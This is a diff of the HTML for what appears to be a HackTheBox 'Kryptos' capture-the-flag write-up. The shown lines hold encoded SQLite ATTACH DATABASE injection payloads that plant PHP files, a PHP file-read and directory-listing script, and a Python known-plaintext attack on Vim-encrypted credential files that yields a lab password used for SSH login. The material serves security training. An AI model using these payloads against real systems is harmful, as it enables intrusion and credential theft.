-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%74%65%73%74%2e%70%68%70%27%20%41%53%20%74%65%73%74%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%65%63%68%6f%20%22%74%65%73%74%22%20%3f%3e%27%29%3b
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%74%65%73%74%2e%70%68%70%27%20%41%53%20%74%65%73%74%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%65%63%68%6f%20%22%74%65%73%74%22%20%3f%3e%27%29%3b
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
@@ -862,7 +850,7 @@ test
 
 <h2 id="arbitrary-file-read">Arbitrary File Read</h2>
 <p><br>We know that dangerous <code class="highlighter-rouge">php</code> functions are disabled, but let’s check which functions are exactly disabled, I overwrote my <code class="highlighter-rouge">test.php</code> file and made it call <code class="highlighter-rouge">phpinfo()</code> instead of printing <code class="highlighter-rouge">test</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%74%65%73%74%2e%70%68%70%27%20%41%53%20%74%65%73%74%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e%27%29%3b
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%74%65%73%74%2e%70%68%70%27%20%41%53%20%74%65%73%74%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%74%65%73%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e%27%29%3b
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
@@ -876,12 +864,12 @@ Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.php
 </code></pre></div></div>
 <p><br>and got the <code class="highlighter-rouge">phpinfo</code> page. It’s a very long page, I opened it in <code class="highlighter-rouge">firefox</code> and here’s the disabled functions part :
-<img src="/images/hackthebox/kryptos/17.png" alt="">
+<br><img src="/images/hackthebox/kryptos/17.png" alt=""><br>
 <br>Almost any function that can get us code execution is disabled, but <code class="highlighter-rouge">scandir()</code> and <code class="highlighter-rouge">file_get_contents()</code> aren’t disabled, I wrote a <code class="highlighter-rouge">php</code> file that takes <code class="highlighter-rouge">file</code> and <code class="highlighter-rouge">dir</code> parameters to read a file or list a directory.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php print_r(scandir("$_GET[dir]")); print_r(file_get_contents("$_GET[file]")); ?&gt;
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[dir]</span><span class="s2">"</span><span class="p">));</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[file]</span><span class="s2">"</span><span class="p">));</span> <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%72%69%63%6b%2e%70%68%70%27%20%41%53%20%72%69%63%6b%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%70%72%69%6e%74%5f%72%28%73%63%61%6e%64%69%72%28%22%24%5f%47%45%54%5b%64%69%72%5d%22%29%29%3b%20%70%72%69%6e%74%5f%72%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%24%5f%47%45%54%5b%66%69%6c%65%5d%22%29%29%3b%20%3f%3e%27%29%3b                                                                                
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%72%69%63%6b%2e%70%68%70%27%20%41%53%20%72%69%63%6b%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%70%72%69%6e%74%5f%72%28%73%63%61%6e%64%69%72%28%22%24%5f%47%45%54%5b%64%69%72%5d%22%29%29%3b%20%70%72%69%6e%74%5f%72%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%24%5f%47%45%54%5b%66%69%6c%65%5d%22%29%29%3b%20%3f%3e%27%29%3b                                                                                
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
@@ -892,7 +880,7 @@ Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb
 <span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 <p><br>Let’s test :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?dir=./
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?dir=./
 [*] Result :
 V3ArraypwnpwnCREATE TABLE pwn (dataz text)
 (
@@ -904,36 +892,36 @@ V3ArraypwnpwnCREATE TABLE pwn (dataz text)
 )
 [?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?file=./rick.php
 [*] Result :
-V3&lt;?php print_r(scandir("$_GET[dir]")); print_r(file_get_contents("$_GET[file]")); ?&gt;
+V3<span class="cp">&lt;?php</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[dir]</span><span class="s2">"</span><span class="p">));</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[file]</span><span class="s2">"</span><span class="p">));</span> <span class="cp">?&gt;</span>
 </code></pre></div></div>
 <p><br>It’s working fine, but as you can see it prints some weird characters which i guess are caused by the <code class="highlighter-rouge">sqlite</code> query.
 <br>In <code class="highlighter-rouge">/home</code> there was a directory for a user called <code class="highlighter-rouge">rijndael</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?dir=/home
-[*] Result :
-V3ArraypwnpwnCREATE TABLE pwn (dataz text)
-(
-    [0] =&gt; .
-    [1] =&gt; ..
-    [2] =&gt; rijndael
-)
-[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?dir=/home/rijndael
-[*] Result :
-V3ArraypwnpwnCREATE TABLE pwn (dataz text)
-(
-    [0] =&gt; .
-    [1] =&gt; ..
-    [2] =&gt; .bash_history
-    [3] =&gt; .bash_logout
-    [4] =&gt; .bashrc
-    [5] =&gt; .cache
-    [6] =&gt; .gnupg
-    [7] =&gt; .profile
-    [8] =&gt; .ssh
-    [9] =&gt; creds.old
-    [10] =&gt; creds.txt
-    [11] =&gt; kryptos
-    [12] =&gt; user.txt
-)
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">?</span><span class="p">]</span> <span class="nx">URL</span> <span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">d9e28afcf0b274a5e0542abb67db0784</span><span class="o">/</span><span class="nx">rick</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nb">dir</span><span class="o">=/</span><span class="nx">home</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Result</span> <span class="o">:</span>
+<span class="nx">V3ArraypwnpwnCREATE</span> <span class="nx">TABLE</span> <span class="nx">pwn</span> <span class="p">(</span><span class="nx">dataz</span> <span class="nx">text</span><span class="p">)</span>
+<span class="p">(</span>
+    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span>
+    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">..</span>
+    <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">rijndael</span>
+<span class="p">)</span>
+<span class="p">[</span><span class="o">?</span><span class="p">]</span> <span class="nx">URL</span> <span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">d9e28afcf0b274a5e0542abb67db0784</span><span class="o">/</span><span class="nx">rick</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nb">dir</span><span class="o">=/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rijndael</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Result</span> <span class="o">:</span>
+<span class="nx">V3ArraypwnpwnCREATE</span> <span class="nx">TABLE</span> <span class="nx">pwn</span> <span class="p">(</span><span class="nx">dataz</span> <span class="nx">text</span><span class="p">)</span>
+<span class="p">(</span>
+    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span>
+    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">..</span>
+    <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span><span class="nx">bash_history</span>
+    <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span><span class="nx">bash_logout</span>
+    <span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span><span class="nx">bashrc</span>
+    <span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span><span class="nx">cache</span>
+    <span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span><span class="nx">gnupg</span>
+    <span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span><span class="nx">profile</span>
+    <span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="o">.</span><span class="nx">ssh</span>
+    <span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">creds</span><span class="o">.</span><span class="nx">old</span>
+    <span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">creds</span><span class="o">.</span><span class="nx">txt</span>
+    <span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">kryptos</span>
+    <span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">user</span><span class="o">.</span><span class="nx">txt</span>
+<span class="p">)</span>
 </code></pre></div></div>
 <p><br>I couldn’t read <code class="highlighter-rouge">user.txt</code> or go to the ssh directory, but I could read <code class="highlighter-rouge">creds.txt</code> and <code class="highlighter-rouge">creds.old</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rick.php?file=/home/rijndael/creds.old
@@ -954,10 +942,10 @@ V3VimCrypt~02!REATE TABLE pwn (dataz text)
 vnd]KyYC}56gMRAn
 </code></pre></div></div>
 <p><br>But because of that weird characters thing the files were partially damaged, so I wrote another php <code class="highlighter-rouge">file</code> to print the base-64 encoded value of the file between a bunch of newlines :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php echo "\n\n\n\n\n"; echo base64_encode(file_get_contents("$_GET[file]")); echo "\n\n\n\n\n" ?&gt;
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">"</span><span class="se">\n\n\n\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$_GET[file]</span><span class="s2">"</span><span class="p">));</span> <span class="k">echo</span> <span class="s2">"</span><span class="se">\n\n\n\n\n</span><span class="s2">"</span> <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%72%69%63%6b%32%2e%70%68%70%27%20%41%53%20%72%69%63%6b%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%65%63%68%6f%20%22%5c%6e%5c%6e%5c%6e%5c%6e%5c%6e%22%3b%20%65%63%68%6f%20%62%61%73%65%36%34%5f%65%6e%63%6f%64%65%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%24%5f%47%45%54%5b%66%69%6c%65%5d%22%29%29%3b%20%65%63%68%6f%20%22%5c%6e%5c%6e%5c%6e%5c%6e%5c%6e%22%20%3f%3e%27%29%3b                             
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE<span class="err">&amp;</span>bookid=%31%3b%41%54%54%41%43%48%20%44%41%54%41%42%41%53%45%20%27%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%72%69%63%6b%32%2e%70%68%70%27%20%41%53%20%72%69%63%6b%3b%43%52%45%41%54%45%20%54%41%42%4c%45%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%49%4e%53%45%52%54%20%49%4e%54%4f%20%72%69%63%6b%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%56%41%4c%55%45%53%20%28%27%3c%3f%70%68%70%20%65%63%68%6f%20%22%5c%6e%5c%6e%5c%6e%5c%6e%5c%6e%22%3b%20%65%63%68%6f%20%62%61%73%65%36%34%5f%65%6e%63%6f%64%65%28%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%22%24%5f%47%45%54%5b%66%69%6c%65%5d%22%29%29%3b%20%65%63%68%6f%20%22%5c%6e%5c%6e%5c%6e%5c%6e%5c%6e%22%20%3f%3e%27%29%3b                             
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
@@ -1018,17 +1006,15 @@ creds.txt: Vim encrypted file data
 <blockquote>
   <p>The way CFB works is to compute a stream of data (the keystream), then XOR it with the plaintext. However Vim is reusing the keystream, in pseudocode:</p>
 
-  <div class="highlighter-rouge">
-<div class="highlight"><pre class="highlight"><code>keystream = Blowfish(iv)
+  <pre><code class="language-pseudocode">keystream = Blowfish(iv)
 ciphertext1 = XOR(keystream, plaintext[0:7])
 ciphertext2 = XOR(keystream, plaintext[8:15])
-</code></pre></div>  </div>
+</code></pre>
 
   <p>This means by a simple relationship we can recover the keystream:</p>
 
-  <div class="highlighter-rouge">
-<div class="highlight"><pre class="highlight"><code>keystream = XOR(ciphertext1, plaintext[0:7])
-</code></pre></div>  </div>
+  <pre><code class="language-pseudocode">keystream = XOR(ciphertext1, plaintext[0:7])
+</code></pre>
 </blockquote>
 
 <p><br>With this information I started testing some stuff. We have <code class="highlighter-rouge">creds.old</code> :</p>
@@ -1036,41 +1022,41 @@ ciphertext2 = XOR(keystream, plaintext[8:15])
 </code></pre></div></div>
 <p><br>As you can see <code class="highlighter-rouge">rijndael</code> which is the username might be also present in the encrypted file as the first 8 bytes. So I tried using <code class="highlighter-rouge">rijndael</code> as the known plaintext. 
 <br>In python I opened the file for reading :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; with open("./creds.txt","rb") as f:
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"./creds.txt"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
 </code></pre></div></div>
 <p><br>We don’t need the first 28 bytes : 12 bytes for the header (<code class="highlighter-rouge">VimCrypt~02!</code>) + 8 bytes for the salt + 8 bytes for the <code class="highlighter-rouge">IV</code>. So I stored them in a variable that I won’t use :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...     temp = f.read(28)
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span>     <span class="n">temp</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span>
 </code></pre></div></div>
 <p><br>Then we have about 4 blocks left (each block 8 bytes) :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# xxd creds.txt
-00000000: 5669 6d43 7279 7074 7e30 3221 0b18 e435  VimCrypt~02!...5
-00000010: cb56 129a 3544 8040 703b 962d 930d a810  .V..5D.@p;.-....
-00000020: 766e 645d c14b e21c 7959 437d d935 fb36  vnd].K..yYC}.5.6
-00000030: 674d 5241 8b6e                           gMRA.n
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">kryptos</span><span class="err">#</span> <span class="n">xxd</span> <span class="n">creds</span><span class="p">.</span><span class="n">txt</span>
+<span class="mo">00000000</span><span class="o">:</span> <span class="mi">5669</span> <span class="mi">6</span><span class="n">d43</span> <span class="mi">7279</span> <span class="mi">7074</span> <span class="mf">7e30</span> <span class="mi">3221</span> <span class="mi">0</span><span class="n">b18</span> <span class="n">e435</span>  <span class="n">VimCrypt</span><span class="o">~</span><span class="mo">02</span><span class="o">!</span><span class="p">...</span><span class="mi">5</span>
+<span class="mo">00000010</span><span class="o">:</span> <span class="n">cb56</span> <span class="mi">129</span><span class="n">a</span> <span class="mi">3544</span> <span class="mi">8040</span> <span class="mi">703</span><span class="n">b</span> <span class="mi">962</span><span class="n">d</span> <span class="mi">930</span><span class="n">d</span> <span class="n">a810</span>  <span class="p">.</span><span class="n">V</span><span class="p">..</span><span class="mi">5</span><span class="n">D</span><span class="p">.</span><span class="err">@</span><span class="n">p</span><span class="p">;.</span><span class="o">-</span><span class="p">....</span>
+<span class="mo">00000020</span><span class="o">:</span> <span class="mi">766</span><span class="n">e</span> <span class="mi">645</span><span class="n">d</span> <span class="n">c14b</span> <span class="n">e21c</span> <span class="mi">7959</span> <span class="mi">437</span><span class="n">d</span> <span class="n">d935</span> <span class="n">fb36</span>  <span class="n">vnd</span><span class="p">].</span><span class="n">K</span><span class="p">..</span><span class="n">yYC</span><span class="p">}.</span><span class="mi">5</span><span class="p">.</span><span class="mi">6</span>
+<span class="mo">00000030</span><span class="o">:</span> <span class="mi">674</span><span class="n">d</span> <span class="mi">5241</span> <span class="mi">8</span><span class="n">b6e</span>                           <span class="n">gMRA</span><span class="p">.</span><span class="n">n</span>
 </code></pre></div></div>
 <p><br>So I read them :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...     block1 = f.read(8)
-...     block2 = f.read(8)
-...     block3 = f.read(8)
-...     block4 = f.read(8)
-...     f.close()
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span>     <span class="n">block1</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="o">...</span>     <span class="n">block2</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="o">...</span>     <span class="n">block3</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="o">...</span>     <span class="n">block4</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="o">...</span>     <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p><br>I used the same relation from the article to get the key :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>keystream = XOR(ciphertext1, plaintext[0:7])
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">keystream</span> <span class="o">=</span> <span class="n">XOR</span><span class="p">(</span><span class="n">ciphertext1</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">7</span><span class="p">])</span>
 </code></pre></div></div>
 <p><br>I <code class="highlighter-rouge">XOR</code>ed the plaintext (<code class="highlighter-rouge">rijndael</code>) with the first block :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; key = ''.join(chr(ord(a)^ord(b)) for a, b in zip(block1, 'rijndael')) 
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">key</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">block1</span><span class="p">,</span> <span class="s">'rijndael'</span><span class="p">))</span> 
 </code></pre></div></div>
 <p><br>Then I tried to decode the first 2 blocks with the retrieved key and it worked successfully :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; print ''.join(chr(ord(a)^ord(b)) for a, b in zip(block1, key))
-rijndael
-&gt;&gt;&gt; print ''.join(chr(ord(a)^ord(b)) for a, b in zip(block2, key))
-/ bkVBL
-&gt;&gt;&gt;
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">block1</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
+<span class="n">rijndael</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">block2</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
+<span class="o">/</span> <span class="n">bkVBL</span>
+<span class="o">&gt;&gt;&gt;</span>
 </code></pre></div></div>
 <p><br>After my testing was successful I wrote this script which does it automatically :
 <br><code class="highlighter-rouge">vim-decrypt.py</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 
 <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
@@ -1114,7 +1100,7 @@ rijndael / bkVBL8Q9HuBSpj
 root@kali:~/Desktop/HTB/boxes/kryptos# 
 </code></pre></div></div>
 <p><br>Then I could ssh into the box as <code class="highlighter-rouge">rijndael</code> :
-<img src="/images/hackthebox/kryptos/18.png" alt="">
+<br><img src="/images/hackthebox/kryptos/18.png" alt=""><br>
 <br>We owned user.
 <br></p>
 <hr>
@@ -1151,8 +1137,7 @@ kryptos.py                                                                      
 root@kali:~/Desktop/HTB/boxes/kryptos# 
 </code></pre></div></div>
 <p><br><code class="highlighter-rouge">kryptos.py</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
-<span class="kn">import</span> <span class="nn">random</span> 
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span> 
 <span class="kn">import</span> <span class="nn">json</span>
 <span class="kn">import</span> <span class="nn">hashlib</span>
 <span class="kn">import</span> <span class="nn">binascii</span>
@@ -1253,53 +1238,53 @@ tcp6       0      0 :::80                   :::*                    LISTEN      
